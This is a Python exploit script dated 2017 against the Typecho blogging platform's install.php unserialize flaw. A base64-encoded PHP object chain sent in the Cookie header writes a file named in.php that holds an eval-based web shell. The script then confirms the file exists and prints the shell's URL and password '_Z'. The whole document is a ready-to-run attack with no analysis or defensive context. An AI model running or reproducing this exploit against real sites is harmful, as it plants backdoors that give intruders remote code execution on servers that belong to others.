#!/usr/bin/dev python
# -*- coding:utf-8 -*-
# author: Lion Ei'Jonson
# date:2017/10/26

import sys
import requests

def usage():
	print("[*]Useage: python %s http://www.lioneijonson.cn" % sys.argv[0])

def get_url(site):
	header = { 'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
	'Accept-Encoding':'gzip, deflate',
	'Cookie':'__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTY6ImZpbGVfcHV0X2NvbnRlbnRzKCdpbi5waHAnLCc8P3BocCBAZXZhbCgkX1BPU1RbX1pdKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9',
	'Referer':site,
	'Connection':'close',
	'Upgrade-Insecure-Requests':'1'}
	target = site + "/install.php?finish=1"
	try:
		requests.get(target, headers=header,allow_redirects=False)
	except:
		print("[!]Target is not available")
		sys.exit()
	if file_exit(site):
		print("[*]Target is vulnerable")
		print("[*]shell:%s/in.php" % site)
		print("[*]password:_Z")	

def file_exit(site):
	target = site + "/in.php"
	response = requests.get(target)
	if response.status_code == 200:
		return True
	else:
		print("[!]Target is not vulnerable")
		sys.exit()

if __name__ == '__main__':
	if len(sys.argv) != 2:
		usage()
		sys.exit()
	if(sys.argv[1][:4]) != "http":
		site = "http://" + sys.argv[1]
	else:
		site = sys.argv[1]
	get_url(site)